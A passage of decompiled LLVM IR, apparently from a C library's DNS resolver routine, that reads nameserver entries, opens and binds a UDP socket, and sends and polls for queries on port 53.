  %v3_d858 = zext i8 %v2_d858 to i32
  store i32 %v3_d858, i32* %r3.global-to-local, align 4
  %v2_d85c = icmp eq i8 %v2_d858, 0
  br i1 %v2_d85c, label %dec_label_pc_d874, label %dec_label_pc_d868

dec_label_pc_d868:                                ; preds = %dec_label_pc_d858.preheader, %dec_label_pc_d854
  %v0_d854 = phi i32 [ %v1_d854, %dec_label_pc_d854 ], [ %storemerge139, %dec_label_pc_d858.preheader ]
  %v0_d868 = phi i32 [ %v3_d858, %dec_label_pc_d854 ], [ %v3_d85867, %dec_label_pc_d858.preheader ]
  %v1_d86c.in = phi i32 [ %v3_d858, %dec_label_pc_d854 ], [ %v3_d85867, %dec_label_pc_d858.preheader ]
  %v7_d868 = icmp eq i32 %v0_d868, 32
  br i1 %v7_d868, label %dec_label_pc_d874, label %bb198

bb198:                                            ; preds = %dec_label_pc_d868
  %v1_d86c = add nsw i32 %v1_d86c.in, -9
  %tmp218 = icmp ugt i32 %v1_d86c, 4
  br i1 %tmp218, label %dec_label_pc_d854, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %dec_label_pc_d868, %dec_label_pc_d854, %bb198, %dec_label_pc_d858.preheader
  %v2_d880 = phi i32 [ %storemerge139, %dec_label_pc_d858.preheader ], [ %v0_d854, %dec_label_pc_d868 ], [ %v1_d854, %dec_label_pc_d854 ], [ %v0_d854, %bb198 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d6f8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v3_d880 = inttoptr i32 %v2_d880 to i8*
  store i8 0, i8* %v3_d880, align 1
  %v0_d884 = call i32 @__lookup_ipliteral()
  %tmp199 = icmp slt i32 %v0_d884, 1
  br i1 %tmp199, label %dec_label_pc_d93c, label %dec_label_pc_d890

dec_label_pc_d890:                                ; preds = %dec_label_pc_d874
  %v3_d890 = load i16, i16* %stack_var_-132, align 2
  %v4_d890 = sext i16 %v3_d890 to i32
  store i32 %v4_d890, i32* @r6, align 4
  store i32 %v0_d8a8, i32* @ip, align 4
  %v7_d898 = icmp eq i16 %v3_d890, 2
  %v1_d89c = add i32 %v0_d8a8, 1
  store i32 %v1_d89c, i32* @r7, align 4
  br i1 %v7_d898, label %dec_label_pc_d8a4, label %dec_label_pc_d8e8

dec_label_pc_d8a4:                                ; preds = %dec_label_pc_d890
  store i32 28, i32* @r3, align 4
  %v2_d8ac = mul i32 %v0_d8a8, 28
  store i32 %v2_d8ac, i32* @r4, align 4
  store i32 %v2_d70c, i32* %r1.global-to-local, align 4
  %v1_d8c0 = add i32 %v2_d8b4, %v2_d8ac
  %v3_d8c4 = inttoptr i32 %v1_d8c0 to i16*
  %v4_d8c4 = call i32 @memcpy(i16* %v3_d8c4, i32 %v2_d70c, i32 4)
  %v1_d8cc = call i32 @htons(i32 53)
  %v2_d8cc = trunc i32 %v1_d8cc to i16
  store i32 %v2_d8d0, i32* %r3.global-to-local, align 4
  %v0_d8d4 = load i32, i32* @r4, align 4
  %v2_d8d4 = add i32 %v0_d8d4, %v2_d8d0
  store i32 %v2_d8d4, i32* @r4, align 4
  %v0_d8d8 = load i32, i32* @r7, align 4
  %v0_d8dc = load i32, i32* @r6, align 4
  %v1_d8dc = trunc i32 %v0_d8dc to i16
  %v3_d8dc = add i32 %v2_d8d4, -240
  %v4_d8dc = inttoptr i32 %v3_d8dc to i16*
  store i16 %v1_d8dc, i16* %v4_d8dc, align 2
  %v3_d8e0 = load i32, i32* @r4, align 4
  %v4_d8e0 = add i32 %v3_d8e0, -238
  %v5_d8e0 = inttoptr i32 %v4_d8e0 to i16*
  store i16 %v2_d8cc, i16* %v5_d8e0, align 2
  br label %dec_label_pc_d93c

dec_label_pc_d8e8:                                ; preds = %dec_label_pc_d890
  store i32 28, i32* @r5, align 4
  %v2_d8f0 = mul i32 %v0_d8a8, 28
  store i32 %v2_d8f0, i32* @r4, align 4
  store i32 %v2_d69c, i32* @ip, align 4
  %v2_d900 = add i32 %v1_d8f8, %v2_d8f0
  store i32 %v2_d70c, i32* %r1.global-to-local, align 4
  %v3_d908 = inttoptr i32 %v2_d900 to i16*
  %v4_d908 = call i32 @memcpy(i16* %v3_d908, i32 %v2_d70c, i32 16)
  %v1_d910 = call i32 @htons(i32 53)
  %v2_d910 = trunc i32 %v1_d910 to i16
  %v0_d918 = load i32, i32* @r4, align 4
  %v2_d918 = add i32 %v0_d918, %v2_d8d0
  store i32 %v2_d918, i32* @r4, align 4
  %v4_d91c = add i32 %v2_d918, -238
  %v5_d91c = inttoptr i32 %v4_d91c to i16*
  store i16 %v2_d910, i16* %v5_d91c, align 2
  %v1_d924 = load i32, i32* @r4, align 4
  %v2_d924 = add i32 %v1_d924, -216
  %v3_d924 = inttoptr i32 %v2_d924 to i32*
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_d92c = load i32, i32* @r4, align 4
  %v3_d92c = add i32 %v2_d92c, -240
  %v4_d92c = inttoptr i32 %v3_d92c to i16*
  store i16 10, i16* %v4_d92c, align 2
  %v0_d930 = load i32, i32* @r7, align 4
  %v0_d934 = load i32, i32* @r5, align 4
  store i32 10, i32* @r8, align 4
  br label %dec_label_pc_d93c

dec_label_pc_d93c:                                ; preds = %bb196, %bb195, %dec_label_pc_d874, %dec_label_pc_d8a4, %dec_label_pc_d8e8
  %stack_var_-696.0 = phi i32 [ %stack_var_-696.1, %dec_label_pc_d874 ], [ %stack_var_-696.1, %dec_label_pc_d8a4 ], [ %v0_d934, %dec_label_pc_d8e8 ], [ %stack_var_-696.1, %bb195 ], [ %stack_var_-696.1, %bb196 ]
  %stack_var_-692.0 = phi i32 [ %v0_d8a8, %dec_label_pc_d874 ], [ %v0_d8d8, %dec_label_pc_d8a4 ], [ %v0_d930, %dec_label_pc_d8e8 ], [ %v0_d8a8, %bb195 ], [ %v0_d8a8, %bb196 ]
  %v8_d944 = icmp sgt i32 %stack_var_-692.0, 2
  br i1 %v8_d944, label %dec_label_pc_de00, label %dec_label_pc_d948

dec_label_pc_d948:                                ; preds = %dec_label_pc_d93c, %dec_label_pc_d6e4
  %stack_var_-696.1 = phi i32 [ 16, %dec_label_pc_d6e4 ], [ %stack_var_-696.0, %dec_label_pc_d93c ]
  %v0_d8a8 = phi i32 [ 0, %dec_label_pc_d6e4 ], [ %stack_var_-692.0, %dec_label_pc_d93c ]
  %stack_var_-704.3 = phi i32 [ 5000, %dec_label_pc_d6e4 ], [ %stack_var_-704.2, %dec_label_pc_d93c ]
  store i32 64, i32* %r1.global-to-local, align 4
  %v4_d954 = call i32 @fgets(i8* %v3_d954, i32 64, i32 %v7_d6d4)
  %v2_d958 = icmp eq i32 %v4_d954, 0
  br i1 %v2_d958, label %dec_label_pc_de00, label %dec_label_pc_d71c

dec_label_pc_d964:                                ; preds = %entry
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r8, align 4
  store i32 2, i32* @fp, align 4
  br label %dec_label_pc_d97c

dec_label_pc_d97c:                                ; preds = %dec_label_pc_de00, %dec_label_pc_d964
  %stack_var_-696.2 = phi i32 [ 16, %dec_label_pc_d964 ], [ %stack_var_-696.4, %dec_label_pc_de00 ]
  %stack_var_-704.4 = phi i32 [ 5000, %dec_label_pc_d964 ], [ %stack_var_-704.6, %dec_label_pc_de00 ]
  %v2_d97c = ptrtoint i32* %stack_var_-488 to i32
  store i32 2, i32* %stack_var_-280, align 4
  %v1_d98c = call i32 @htons(i32 53)
  store i32 %v2_d97c, i32* %r3.global-to-local, align 4
  %v1_d99c = call i32 @htonl(i32 2130706433)
  store i32 1, i32* @ip, align 4
  br label %dec_label_pc_d9ac

dec_label_pc_d9ac:                                ; preds = %dec_label_pc_de00, %dec_label_pc_d97c
  %stack_var_-696.3 = phi i32 [ %stack_var_-696.2, %dec_label_pc_d97c ], [ %stack_var_-696.4, %dec_label_pc_de00 ]
  %stack_var_-692.2 = phi i32 [ 1, %dec_label_pc_d97c ], [ %stack_var_-692.3, %dec_label_pc_de00 ]
  %stack_var_-704.5 = phi i32 [ %stack_var_-704.4, %dec_label_pc_d97c ], [ %stack_var_-704.6, %dec_label_pc_de00 ]
  %v2_d9ac = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_d9ac, i32* %r3.global-to-local, align 4
  %v0_d9b0 = load i32, i32* @r8, align 4
  store i32 %v0_d9b0, i32* %stack_var_-104, align 4
  store i32 526338, i32* %r1.global-to-local, align 4
  %v3_d9c0 = call i32 @socket(i32 %v0_d9b0, i32 526338, i32 0)
  %v0_d9c4 = load i32, i32* @r8, align 4
  %v7_d9c4 = icmp eq i32 %v0_d9c4, 10
  %. = zext i1 %v7_d9c4 to i32
  %tmp219 = icmp slt i32 %v3_d9c0, 0
  %v4_d9d0 = zext i1 %tmp219 to i32
  %v5_d9d0 = and i32 %., %v4_d9d0
  store i32 %v5_d9d0, i32* %r3.global-to-local, align 4
  %v6_d9d0 = icmp eq i32 %v5_d9d0, 0
  store i32 %v3_d9c0, i32* @sl, align 4
  br i1 %v6_d9d0, label %dec_label_pc_da04, label %dec_label_pc_d9dc

dec_label_pc_d9dc:                                ; preds = %dec_label_pc_d9ac
  %v0_d9dc = call i32 @__errno_location()
  %v1_d9e0 = inttoptr i32 %v0_d9dc to i32*
  %v2_d9e0 = load i32, i32* %v1_d9e0, align 4
  store i32 %v2_d9e0, i32* %r3.global-to-local, align 4
  %v7_d9e4 = icmp eq i32 %v2_d9e0, 97
  br i1 %v7_d9e4, label %dec_label_pc_d9ec, label %dec_label_pc_da04thread-pre-split

dec_label_pc_d9ec:                                ; preds = %dec_label_pc_d9dc
  store i32 526338, i32* %r1.global-to-local, align 4
  %v3_d9f8 = call i32 @socket(i32 2, i32 526338, i32 0)
  store i32 2, i32* @r8, align 4
  store i32 %v3_d9f8, i32* @sl, align 4
  br label %dec_label_pc_da04

dec_label_pc_da04thread-pre-split:                ; preds = %dec_label_pc_d9dc
  %v0_da04.pr = load i32, i32* @sl, align 4
  br label %dec_label_pc_da04

dec_label_pc_da04:                                ; preds = %dec_label_pc_da04thread-pre-split, %dec_label_pc_d9ac, %dec_label_pc_d9ec
  %v0_da0c = phi i32 [ %v0_da04.pr, %dec_label_pc_da04thread-pre-split ], [ %v3_d9c0, %dec_label_pc_d9ac ], [ %v3_d9f8, %dec_label_pc_d9ec ]
  %v1_da04 = icmp slt i32 %v0_da0c, 0
  br i1 %v1_da04, label %dec_label_pc_de18, label %dec_label_pc_da0c

dec_label_pc_da0c:                                ; preds = %dec_label_pc_da04
  store i32 %v2_d698, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-696.3, i32* @r2, align 4
  %v3_da18 = call i32 @bind(i32 %v0_da0c, i32 %v2_d698, i32 %stack_var_-696.3)
  %v1_da1c = icmp slt i32 %v3_da18, 0
  br i1 %v1_da1c, label %dec_label_pc_de18, label %dec_label_pc_da24

dec_label_pc_da24:                                ; preds = %dec_label_pc_da0c
  store i32 54828, i32* %r1.global-to-local, align 4
  %v0_da2c = load i32, i32* @sl, align 4
  %v4_da30 = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-76, i32 54828, i32 %v0_da2c)
  %v3_da34 = load i32, i32* %stack_var_-44, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_da3c = call i32 @__pthread_setcancelstate(i32 %v3_da34, i32* null)
  %v0_da40 = load i32, i32* @r8, align 4
  %v7_da40 = icmp eq i32 %v0_da40, 10
  br i1 %v7_da40, label %dec_label_pc_da48, label %dec_label_pc_dae8

dec_label_pc_da48:                                ; preds = %dec_label_pc_da24
  store i32 0, i32* @r4, align 4
  %v2_da4c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_da4c, i32* %r3.global-to-local, align 4
  store i32 4, i32* @ip, align 4
  %v0_da54 = load i32, i32* @sl, align 4
  store i32 41, i32* %r1.global-to-local, align 4
  store i32 26, i32* @r2, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_da68 = call i32 @setsockopt(i32 %v0_da54, i32 41, i32 26, i32 %v2_da4c, i32 4)
  store i32 %v2_d69c, i32* %r3.global-to-local, align 4
  %v0_da70 = load i32, i32* @r4, align 4
  store i32 %v0_da70, i32* @r6, align 4
  store i32 %v2_d69c, i32* @r7, align 4
  %v2_da78 = ptrtoint i32* %stack_var_-256 to i32
  store i32 %v2_da78, i32* @r5, align 4
  store i32 28, i32* @sb, align 4
  store i32 %v0_da70, i32* @r8, align 4
  %v5_dae464 = icmp slt i32 %v0_da70, %stack_var_-692.2
  br i1 %v5_dae464, label %dec_label_pc_da88, label %dec_label_pc_dae8

dec_label_pc_da88:                                ; preds = %dec_label_pc_da48, %dec_label_pc_dad4
  %v0_da94 = phi i32 [ %v1_dad4, %dec_label_pc_dad4 ], [ %v0_da70, %dec_label_pc_da48 ]
  %v0_da88 = phi i32 [ %v1_dad8, %dec_label_pc_dad4 ], [ %v2_da78, %dec_label_pc_da48 ]
  %v1_da88 = add i32 %v0_da88, -24
  %v2_da88 = inttoptr i32 %v1_da88 to i16*
  %v3_da88 = load i16, i16* %v2_da88, align 2
  %v4_da88 = zext i16 %v3_da88 to i32
  store i32 %v4_da88, i32* @r3, align 4
  %v7_da8c = icmp eq i16 %v3_da88, 2
  br i1 %v7_da8c, label %dec_label_pc_da94, label %dec_label_pc_dad4

dec_label_pc_da94:                                ; preds = %dec_label_pc_da88
  %v1_da94 = load i32, i32* @sb, align 4
  %v2_da94 = mul i32 %v1_da94, %v0_da94
  %v1_da98 = add i32 %v2_da94, 20
  %v0_da9c = load i32, i32* @r7, align 4
  %v2_da9c = add i32 %v2_da94, 4
  %v1_daa0 = add i32 %v2_da9c, %v0_da9c
  store i32 %v1_daa0, i32* %r1.global-to-local, align 4
  %v2_daa8 = add i32 %v1_da98, %v0_da9c
  %v1_daac = add i32 %v2_da94, 8
  store i32 %v1_daac, i32* @r4, align 4
  %v3_dab0 = inttoptr i32 %v2_daa8 to i16*
  %v4_dab0 = call i32 @memcpy(i16* %v3_dab0, i32 %v1_daa0, i32 4)
  %v0_dab4 = load i32, i32* @r7, align 4
  %v1_dab4 = load i32, i32* @r4, align 4
  %v2_dab4 = add i32 %v1_dab4, %v0_dab4
  store i32 ptrtoint (i32* @global_var_19d3c.510 to i32), i32* %r1.global-to-local, align 4
  %v3_dac0 = inttoptr i32 %v2_dab4 to i16*
  %v4_dac0 = call i32 @memcpy(i16* %v3_dac0, i32 ptrtoint (i32* @global_var_19d3c.510 to i32), i32 12)
  store i32 10, i32* @ip, align 4
  %v2_dac8 = load i32, i32* @r5, align 4
  %v3_dac8 = add i32 %v2_dac8, -24
  %v4_dac8 = inttoptr i32 %v3_dac8 to i16*
  store i16 10, i16* %v4_dac8, align 2
  %v0_dacc = load i32, i32* @r8, align 4
  %v1_dacc = load i32, i32* @r5, align 4
  %v2_dacc = add i32 %v1_dacc, -20
  %v3_dacc = inttoptr i32 %v2_dacc to i32*
  store i32 %v0_dacc, i32* %v3_dacc, align 4
  %v0_dad0 = load i32, i32* @r8, align 4
  %v1_dad0 = load i32, i32* @r5, align 4
  %v2_dad0 = inttoptr i32 %v1_dad0 to i32*
  store i32 %v0_dad0, i32* %v2_dad0, align 4
  %v0_dad4.pre = load i32, i32* @r6, align 4
  %v0_dad8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dad4

dec_label_pc_dad4:                                ; preds = %dec_label_pc_da88, %dec_label_pc_da94
  %v0_dad8 = phi i32 [ %v0_da88, %dec_label_pc_da88 ], [ %v0_dad8.pre, %dec_label_pc_da94 ]
  %v0_dad4 = phi i32 [ %v0_da94, %dec_label_pc_da88 ], [ %v0_dad4.pre, %dec_label_pc_da94 ]
  %v1_dad4 = add i32 %v0_dad4, 1
  store i32 %v1_dad4, i32* @r6, align 4
  %v1_dad8 = add i32 %v0_dad8, 28
  store i32 %v1_dad8, i32* @r5, align 4
  %v5_dae4 = icmp slt i32 %v1_dad4, %stack_var_-692.2
  br i1 %v5_dae4, label %dec_label_pc_da88, label %dec_label_pc_dae8

dec_label_pc_dae8:                                ; preds = %dec_label_pc_dad4, %dec_label_pc_da48, %dec_label_pc_da24
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v3_daf0 = mul i32 %arg1, 4
  store i32 %v3_daf0, i32* @r2, align 4
  %v3_daf4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_daf4, i32* @r0, align 4
  %v0_daf8 = call i32 @memset()
  %v0_db08 = load i32, i32* @sl, align 4
  store i32 %v0_db08, i32* %stack_var_-64, align 4
  %v1_db0c = call i32 @mtime(i32 %v0_daf8)
  %v0_db10 = load i32, i32* @fp, align 4
  store i32 %v0_db10, i32* %r1.global-to-local, align 4
  %v2_db1c = sdiv i32 %stack_var_-704.5, %v0_db10
  store i32 %v1_db0c, i32* %r3.global-to-local, align 4
  %v2_db28 = sub i32 %v1_db0c, %v2_db1c
  store i32 %v2_db28, i32* @fp, align 4
  %v2_db2c = mul i32 %arg1, 2
  store i32 %v1_db0c, i32* @r7, align 4
  store i32 0, i32* @sb, align 4
  %v2_dbe0 = ptrtoint i32* %stack_var_-64 to i32
  %v5_dbc434 = icmp sgt i32 %arg1, 0
  br label %dec_label_pc_ddd0

dec_label_pc_db44:                                ; preds = %dec_label_pc_ddd0
  %v0_db48 = load i32, i32* @fp, align 4
  %v2_db48 = sub i32 %v1_db48, %v0_db48
  store i32 %v2_db48, i32* %r3.global-to-local, align 4
  %v3_db4c = icmp ult i32 %v2_db48, %v2_db1c
  br i1 %v3_db4c, label %dec_label_pc_dbd4, label %dec_label_pc_dbbc.preheader

dec_label_pc_dbbc.preheader:                      ; preds = %dec_label_pc_db44
  store i32 0, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  br i1 %v5_dbc434, label %dec_label_pc_db60, label %dec_label_pc_dbc8

dec_label_pc_db60:                                ; preds = %dec_label_pc_dbbc.preheader, %dec_label_pc_dbb4
  %v0_dbb496 = phi i32 [ %v1_dbb4, %dec_label_pc_dbb4 ], [ 0, %dec_label_pc_dbbc.preheader ]
  %v0_db64 = phi i32 [ %v1_dbb8, %dec_label_pc_dbb4 ], [ 0, %dec_label_pc_dbbc.preheader ]
  %v3_db60 = load i32, i32* %stack_var_0, align 4
  %v2_db64 = add i32 %v3_db60, %v0_db64
  %v3_db64 = inttoptr i32 %v2_db64 to i32*
  %v4_db64 = load i32, i32* %v3_db64, align 4
  store i32 %v4_db64, i32* %r3.global-to-local, align 4
  %v2_db68 = icmp eq i32 %v4_db64, 0
  br i1 %v2_db68, label %dec_label_pc_db9c.preheader, label %dec_label_pc_dbb4

dec_label_pc_db9c.preheader:                      ; preds = %dec_label_pc_db60
  store i32 %v2_d69c, i32* @r4, align 4
  br label %dec_label_pc_db9c

dec_label_pc_db7c:                                ; preds = %dec_label_pc_db9c
  %v0_db84 = load i32, i32* @r5, align 4
  %v2_db84 = add i32 %v0_db84, %arg2
  %v3_db84 = inttoptr i32 %v2_db84 to i32*
  %v4_db84 = load i32, i32* %v3_db84, align 4
  store i32 %v4_db84, i32* @r1, align 4
  %v2_db88 = add i32 %v0_db84, %arg3
  %v3_db88 = inttoptr i32 %v2_db88 to i32*
  %v4_db88 = load i32, i32* %v3_db88, align 4
  store i32 %v4_db88, i32* @r2, align 4
  %v0_db94 = call i32 @sendto()
  %v0_db98 = load i32, i32* @r4, align 4
  %v1_db98 = add i32 %v0_db98, 28
  store i32 %v1_db98, i32* @r4, align 4
  %v0_dba0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_db9c

dec_label_pc_db9c:                                ; preds = %dec_label_pc_db9c.preheader, %dec_label_pc_db7c
  %v0_dbac = phi i32 [ 0, %dec_label_pc_db9c.preheader ], [ %v0_dba0.pre, %dec_label_pc_db7c ]
  %v2_dba0 = sub i32 %v0_dbac, %stack_var_-692.2
  %v4_dba0 = xor i32 %v0_dbac, %stack_var_-692.2
  %v5_dba0 = xor i32 %v2_dba0, %v0_dbac
  %v6_dba0 = and i32 %v5_dba0, %v4_dba0
  %v7_dba0 = icmp slt i32 %v6_dba0, 0
  %v8_dba0 = icmp slt i32 %v2_dba0, 0
  %v0_dba4 = load i32, i32* @sl, align 4
  store i32 %v0_dba4, i32* @r0, align 4
  store i32 16384, i32* @r3, align 4
  %v1_dbac = add i32 %v0_dbac, 1
  store i32 %v1_dbac, i32* @r8, align 4
  %v2_dbb0 = xor i1 %v8_dba0, %v7_dba0
  br i1 %v2_dbb0, label %dec_label_pc_db7c, label %dec_label_pc_dbb4.loopexit

dec_label_pc_dbb4.loopexit:                       ; preds = %dec_label_pc_db9c
  %v0_dbb4.pre = load i32, i32* @r6, align 4
  %v0_dbb8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbb4

dec_label_pc_dbb4:                                ; preds = %dec_label_pc_dbb4.loopexit, %dec_label_pc_db60
  %v0_dbb8 = phi i32 [ %v0_dbb8.pre, %dec_label_pc_dbb4.loopexit ], [ %v0_db64, %dec_label_pc_db60 ]
  %v0_dbb4 = phi i32 [ %v0_dbb4.pre, %dec_label_pc_dbb4.loopexit ], [ %v0_dbb496, %dec_label_pc_db60 ]
  %v1_dbb4 = add i32 %v0_dbb4, 1
  store i32 %v1_dbb4, i32* @r6, align 4
  %v1_dbb8 = add i32 %v0_dbb8, 4
  store i32 %v1_dbb8, i32* @r5, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v5_dbc4 = icmp slt i32 %v1_dbb4, %arg1
  br i1 %v5_dbc4, label %dec_label_pc_db60, label %dec_label_pc_dbbc.dec_label_pc_dbc8_crit_edge

dec_label_pc_dbbc.dec_label_pc_dbc8_crit_edge:    ; preds = %dec_label_pc_dbb4
  %v0_dbd0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_dbc8

dec_label_pc_dbc8:                                ; preds = %dec_label_pc_dbbc.dec_label_pc_dbc8_crit_edge, %dec_label_pc_dbbc.preheader
  %v0_dbd0 = phi i32 [ %v0_dbd0.pre, %dec_label_pc_dbbc.dec_label_pc_dbc8_crit_edge ], [ %v1_db48, %dec_label_pc_dbbc.preheader ]
  store i32 %v0_dbd0, i32* @fp, align 4
  br label %dec_label_pc_dbd4

dec_label_pc_dbd4:                                ; preds = %dec_label_pc_db44, %dec_label_pc_dbc8
  %v0_dbd8 = phi i32 [ %v0_dbd0, %dec_label_pc_dbc8 ], [ %v1_db48, %dec_label_pc_db44 ]
  %v1_dbdc = phi i32 [ %v0_dbd0, %dec_label_pc_dbc8 ], [ %v0_db48, %dec_label_pc_db44 ]
  %stack_var_-700.0 = phi i32 [ %v2_db2c, %dec_label_pc_dbc8 ], [ %stack_var_-700.3, %dec_label_pc_db44 ]
  store i32 %v2_db1c, i32* %r3.global-to-local, align 4
  %v2_dbd8 = sub i32 %v2_db1c, %v0_dbd8
  %v2_dbdc = add i32 %v2_dbd8, %v1_dbdc
  store i32 1, i32* %r1.global-to-local, align 4
  %v4_dbe8 = call i32 @poll(i32 %v2_dbe0, i32 1, i32 %v2_dbdc, i32 %v2_db1c)
  %v5_dbf0 = icmp sgt i32 %v4_dbe8, 0
  br i1 %v5_dbf0, label %dec_label_pc_dd84, label %dec_label_pc_ddc8

dec_label_pc_dbf8:                                ; preds = %dec_label_pc_dd84
  %v7_dbfc = icmp sgt i32 %v0_ddb4, 3
  br i1 %v7_dbfc, label %.thread16, label %dec_label_pc_dd84

.thread16:                                        ; preds = %dec_label_pc_dbf8
  br label %dec_label_pc_dc10

dec_label_pc_dc0c:                                ; preds = %dec_label_pc_dc2c
  %v1_dc0c = add i32 %v0_dc3c.pre, 1
  %v0_dc18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_dc10

dec_label_pc_dc10:                                ; preds = %.thread16, %dec_label_pc_dc0c
  %v0_dc18 = phi i32 [ %v2_d69c, %.thread16 ], [ %v0_dc18.pre, %dec_label_pc_dc0c ]
  %storemerge21 = phi i32 [ 0, %.thread16 ], [ %v1_dc0c, %dec_label_pc_dc0c ]
  store i32 %storemerge21, i32* @r7, align 4
  store i32 %v2_d698, i32* %r1.global-to-local, align 4
  %v1_dc24 = add i32 %v0_dc18, 28
  store i32 %v1_dc24, i32* @r4, align 4
  %v6_dc28 = icmp slt i32 %storemerge21, %stack_var_-692.2
  br i1 %v6_dc28, label %dec_label_pc_dc2c, label %dec_label_pc_dc38

dec_label_pc_dc2c:                                ; preds = %dec_label_pc_dc10
  %v3_dc2c = inttoptr i32 %v0_dc18 to i8*
  %v4_dc2c = call i32 @memcmp(i8* %v3_dc2c, i32 %v2_d698, i32 %stack_var_-696.3)
  %v2_dc30 = icmp eq i32 %v4_dc2c, 0
  %v0_dc3c.pre = load i32, i32* @r7, align 4
  br i1 %v2_dc30, label %dec_label_pc_dc38, label %dec_label_pc_dc0c

dec_label_pc_dc38:                                ; preds = %dec_label_pc_dc2c, %dec_label_pc_dc10
  %v0_dcfc = phi i32 [ %storemerge21, %dec_label_pc_dc10 ], [ %v0_dc3c.pre, %dec_label_pc_dc2c ]
  %v9_dc3c = icmp eq i32 %v0_dcfc, %stack_var_-692.2
  br i1 %v9_dc3c, label %dec_label_pc_dd84, label %dec_label_pc_dc58.preheader

dec_label_pc_dc58.preheader:                      ; preds = %dec_label_pc_dc38
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_dc44 = load i32, i32* @sb, align 4
  store i32 %v1_dc44, i32* @ip, align 4
  %v2_dc48 = load i32, i32* @r6, align 4
  %v3_dc48 = add i32 %v2_dc48, %arg2
  store i32 %v3_dc48, i32* %r1.global-to-local, align 4
  %v6_dc6044 = icmp slt i32 %v1_dc44, %arg1
  br i1 %v6_dc6044, label %dec_label_pc_dc64.lr.ph, label %dec_label_pc_dc94

dec_label_pc_dc64.lr.ph:                          ; preds = %dec_label_pc_dc58.preheader
  %v0_dc68.pre = load i32, i32* @r8, align 4
  %v1_dc68 = inttoptr i32 %v0_dc68.pre to i32*
  br label %dec_label_pc_dc64

dec_label_pc_dc54:                                ; preds = %dec_label_pc_dc80, %dec_label_pc_dc64
  %v1_dc54 = add nsw i32 %v0_dc54, 1
  store i32 %v1_dc54, i32* @ip, align 4
  %v6_dc60 = icmp slt i32 %v1_dc54, %arg1
  br i1 %v6_dc60, label %dec_label_pc_dc64, label %dec_label_pc_dc94

dec_label_pc_dc64:                                ; preds = %dec_label_pc_dc64.lr.ph, %dec_label_pc_dc54
  %v0_dc54 = phi i32 [ %v1_dc44, %dec_label_pc_dc64.lr.ph ], [ %v1_dc54, %dec_label_pc_dc54 ]
  %v0_dc78 = phi i32 [ %v3_dc48, %dec_label_pc_dc64.lr.ph ], [ %v1_dc78, %dec_label_pc_dc54 ]
  %v1_dc64 = inttoptr i32 %v0_dc78 to i32*
  %v2_dc64 = load i32, i32* %v1_dc64, align 4
  store i32 %v2_dc64, i32* @lr, align 4
  %v2_dc68 = load i32, i32* %v1_dc68, align 4
  %v1_dc6c = inttoptr i32 %v2_dc64 to i8*
  %v2_dc6c = load i8, i8* %v1_dc6c, align 1
  %v1_dc70 = inttoptr i32 %v2_dc68 to i8*
  %v2_dc70 = load i8, i8* %v1_dc70, align 1
  %v3_dc70 = zext i8 %v2_dc70 to i32
  store i32 %v3_dc70, i32* %r3.global-to-local, align 4
  %v9_dc74 = icmp eq i8 %v2_dc70, %v2_dc6c
  %v1_dc78 = add i32 %v0_dc78, 4
  store i32 %v1_dc78, i32* %r1.global-to-local, align 4
  br i1 %v9_dc74, label %dec_label_pc_dc80, label %dec_label_pc_dc54

dec_label_pc_dc80:                                ; preds = %dec_label_pc_dc64
  %v1_dc80 = add i32 %v2_dc68, 1
  %v2_dc80 = inttoptr i32 %v1_dc80 to i8*
  %v3_dc80 = load i8, i8* %v2_dc80, align 1
  %v1_dc84 = add i32 %v2_dc64, 1
  %v2_dc84 = inttoptr i32 %v1_dc84 to i8*
  %v3_dc84 = load i8, i8* %v2_dc84, align 1
  %v4_dc84 = zext i8 %v3_dc84 to i32
  store i32 %v4_dc84, i32* %r3.global-to-local, align 4
  %v9_dc88 = icmp eq i8 %v3_dc80, %v3_dc84
  br i1 %v9_dc88, label %dec_label_pc_dc98, label %dec_label_pc_dc54

dec_label_pc_dc94:                                ; preds = %dec_label_pc_dc54, %dec_label_pc_dc58.preheader
  %v0_dc9c108 = phi i32 [ %v1_dc44, %dec_label_pc_dc58.preheader ], [ %v1_dc54, %dec_label_pc_dc54 ]
  %v1_dc44.pn = phi i32 [ %v1_dc44, %dec_label_pc_dc58.preheader ], [ %v1_dc54, %dec_label_pc_dc54 ]
  %v9_dc5c.lcssa = icmp eq i32 %v1_dc44.pn, %arg1
  br i1 %v9_dc5c.lcssa, label %dec_label_pc_dd84, label %dec_label_pc_dc98

dec_label_pc_dc98:                                ; preds = %dec_label_pc_dc80, %dec_label_pc_dc94
  %v0_dd2c = phi i32 [ %v0_dc9c108, %dec_label_pc_dc94 ], [ %v0_dc54, %dec_label_pc_dc80 ]
  %v3_dc98 = load i32, i32* %stack_var_0, align 4
  %v3_dc9c = mul i32 %v0_dd2c, 4
  store i32 %v3_dc9c, i32* %r1.global-to-local, align 4
  %v2_dca0 = add i32 %v3_dc98, %v3_dc9c
  %v3_dca0 = inttoptr i32 %v2_dca0 to i32*
  %v4_dca0 = load i32, i32* %v3_dca0, align 4
  store i32 %v4_dca0, i32* %r3.global-to-local, align 4
  %v2_dca4 = icmp eq i32 %v4_dca0, 0
  br i1 %v2_dca4, label %dec_label_pc_dcb0, label %dec_label_pc_dd84

dec_label_pc_dcb0:                                ; preds = %dec_label_pc_dc98
  %v0_dcb0 = load i32, i32* @r8, align 4
